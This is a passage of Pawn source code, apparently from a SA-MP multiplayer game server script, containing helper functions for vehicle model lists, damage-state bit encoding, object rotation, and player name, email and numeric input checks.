        while((pos = strfind(string, tempString, true, (pos + 1))) != -1)
        {
            new
                tempLen = strlen(tempString),
                tempVar,
                i = pos
            ;
            format(tempString, sizeof(tempString), "%s", colorInfo[x][colorID]);

            if (tempLen < 8)
            {
                for (new j; j != (8 - tempLen); ++j)
                {
                    strins(string, " ", pos);
                }
            }
            for ( ; ((string[i] != 0) && (tempVar != 8)) ; ++i, ++tempVar)
            {
                string[i] = tempString[tempVar];
            }
            if (tempLen > 8)
            {
                strdel(string, i, (i + (tempLen - 8)));
            }
            x = -1;
        }
    }
    return string;
}

stock issafefortextdraw(str[])
{
	new safetil = -5;

	for (new i = 0; i < strlen(str); i++)
	{
		if ((str[i] == 126) && (i > safetil))
		{
			if (i >= strlen(str) - 1) // not enough room for the tag to end at all.
			return false;

			if (str[i + 1] == 126)
			return false; // a tilde following a tilde.

			if (str[i + 2] != 126)
			return false; // a tilde not followed by another tilde after 2 chars

			safetil = i + 2; // tilde tag was verified as safe, ignore anything up to this location from further checks (otherwise it'll report tag end tilde as improperly started tag..).
		}
	}
	return true;
}

stock ForbiddenSpawnVehicles(modelid)
{
    switch(modelid)
    {
		case 425, 432, 447, 464, 465, 476, 501, 520, 564: return true;
	}
	return false;
}

stock TunableVehicles(vehicleid) // included nitro + wheels + hydraulics
{
    switch(GetVehicleModel(vehicleid))
    {
        case 400, 401, 402, 404, 405, 409, 410, 411, 412, 415, 418, 419, 420, 421, 422, 426, 429, 436, 438, 439, 442, 445, 451, 458, 466, 467, 470, 474, 475, 477, 478, 479, 480, 489, 490, 491, 492, 495, 496, 506, 507, 516, 517, 518, 526, 527, 529, 533, 534, 535, 536, 540, 541, 542, 545, 546, 547, 549, 550, 551, 555, 558, 559, 560, 561, 562, 565, 566, 567, 575, 576, 579, 580, 585, 587, 589, 600, 602, 603: return true;
	}
	return false;
}

stock PaintjobVehicles(vehicleid) // paintjob only
{
    switch(GetVehicleModel(vehicleid))
    {
        case 412, 483, 534, 535, 536, 558, 559, 560, 561, 562, 565, 566, 567, 575, 576: return true;
	}
	return false;
}

stock RCVehicles(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
	    case 441, 464, 465, 501, 564, 594: return true;
	}
	return false;
}

stock GetVehicleWithinDistance(Float:x1, Float:y1, Float:z1, Float:dist, &veh)
{
	new Float:x2, Float:y2, Float:z2, Float:d;
	for (new i = 1; i < MAX_VEHICLES; i++)
	{
		if (GetVehicleModel(i) > 0)
		{
			GetVehiclePos(i, x2, y2, z2);
			x2 -= x1; y2 -= y1; z2 -= z1;
			d = x2*x2 + y2*y2 + z2*z2;
			if (d < dist)
			{
				veh = i;
				dist = d;
			}
		}
	}
}

stock IsVehicleRcTram(vehicleid) {
	switch(GetVehicleModel(vehicleid)) {
		case 449, 501, 464, 441, 465, 564: return 1;
	}
	return 0;
}

stock IsValidModel(modelid_)
{
	for (new i = 0; i < sizeof(models); i++)
	{
	    if (models[i] == modelid_) return 1;
	    if (models[i] > modelid_) return 0;
	}
	return 0;
}

stock IsInvalidDerbyVehicle(modelid)
{
    switch(modelid)
    {
        case /*Boats*/484, 454, 473, /*Trailers*/435, 450, 591, 606, 607, 610, 569, 590, 584, 570, 608, 611, /*Unique*/537, 538, 449, /*RCveh*/441, 464, 465, 501, 564, 594, /*Airveh*/592, 577, 511, 512, 593, 520, 553, 476, 519, 460, 513, 548, 425, 417, 487, 488, 497, 563, 447, 469: return true;
	}
	return false;
}

encode_lights(light1, light2, light3, light4)
{
	return light1 | (light2 << 1) | (light3 << 2) | (light4 << 3);
}
encode_tires(tire1, tire2, tire3, tire4)
{
	return tire1 | (tire2 << 1) | (tire3 << 2) | (tire4 << 3);
}
encode_tires_bike(rear, front)
{
	return rear | (front << 1);
}
#pragma unused encode_tires_bike
encode_doors(bonnet, boot, driver_door, passenger_door, behind_driver_door, behind_passenger_door)
{
	#pragma unused behind_driver_door
	#pragma unused behind_passenger_door

	// will be modified once again, when rear doors are synced.
	return bonnet | (boot << 8) | (driver_door << 16) | (passenger_door << 24);
}
encode_panels(flp, frp, rlp, rrp, windshield, front_bumper, rear_bumper)
{
	return flp | (frp << 4)  | (rlp << 8)  | (rrp << 12)  | (windshield << 16)  | (front_bumper << 20)  | (rear_bumper << 24);
}

stock SetObjectFaceCoords3D(iObject, Float: fX, Float: fY, Float: fZ, Float: fRollOffset = 0.0, Float: fPitchOffset = 0.0, Float: fYawOffset = 0.0) {
    new Float: fOX,
        Float: fOY,
        Float: fOZ,
        Float: fPitch;
        
    GetObjectPos(iObject, fOX, fOY, fOZ);

    fPitch = floatsqroot(floatpower(fX - fOX, 2.0) + floatpower(fY - fOY, 2.0));
    fPitch = floatabs(atan2(fPitch, fZ - fOZ));

    fZ = atan2(fY - fOY, fX - fOX) - 90.0; // Yaw

    SetObjectRot(iObject, fRollOffset, fPitch + fPitchOffset, fZ + fYawOffset);
}

IsNameValid(Name[])
{
	for (new i = 0; i < strlen(Name); i++)
	{
		if (!((Name[i] >= '0' && Name[i] <= '9') || (Name[i] >= 'A' && Name[i] <= 'Z') ||  Name[i] == '[' || Name[i] == ']' || Name[i] == '_' || Name[i] == '.' || (Name[i] >= 'a' && Name[i] <= 'z')))
		return 0;
	}
	return 1;
}

stock ReturnPlayerID(PlayerName[])
{
	for (new i = 0; i < MAX_PLAYERS; i++)
	{
		if (IsPlayerConnected(i))
		{
			new name[24];
			GetPlayerName(i, name, sizeof(name));
			if (strfind(name, PlayerName, true) !=-1 )
			return i;
		}
	}
	return INVALID_PLAYER_ID;
}

stock IsValidEmail(const email[40])
{
	new emailLen = strlen(email);
	if (emailLen < 5)
	return 0;

	new atcount = 0;
	for (new c = 0; c < emailLen; c++)
	{
        if(email[c] == '@') atcount++;
        {
	        if(atcount > 1)
			return 0;
		}
    }

    if (strfind(email, ".") != -1)
    return 1;

    return 0;
}

/*stock IsNumeric(const string[])
{
	for (new i = 0, j = strlen(string); i < j; i++)
	{
	    if (string[i] == '-') i++;
		if (string[i] > '9' || string[i] < '0') return 0;
	}
	return 1;
}*/

stock IsNumeric(const string[])
{
    // Is Numeric Check 2
	// ------------------
	// By DracoBlue... handles negative numbers

	new length=strlen(string);
	if (length==0) return false;
	for (new i = 0; i < length; i++)
	{
	  if ((string[i] > '9' || string[i] < '0' && string[i]!='-' && string[i]!='+' && string[i]!='.') // Not a number,'+' or '-' or '.'
	         || (string[i]=='-' && i!=0)                                             // A '-' but not first char.
	         || (string[i]=='+' && i!=0)                                             // A '+' but not first char.
	     ) return false;
	}
	if (length==1 && (string[0]=='-' || string[0]=='+' || string[0]=='.')) return false;
	return true;
}

strtok( const string[], &index, const seperator[] = " " )
{
	new
		index2,
		result[ 30 ];

	index2 =  strfind(string, seperator, false, index);


	if (index2 == -1)
	{
		if (strlen(string) > index)
		{
			strmid(result, string, index, strlen(string), 30);
			index = strlen(string);
		}
		return result; // This string is empty, probably, if index came to an end
	}
	if (index2 > (index + 29))
	{
		index2 = index + 29;
		strmid(result, string, index, index2, 30);
		index = index2;
		return result;
	}
	strmid(result, string, index, index2, 30);
	index = index2 + 1;
	return result;
}
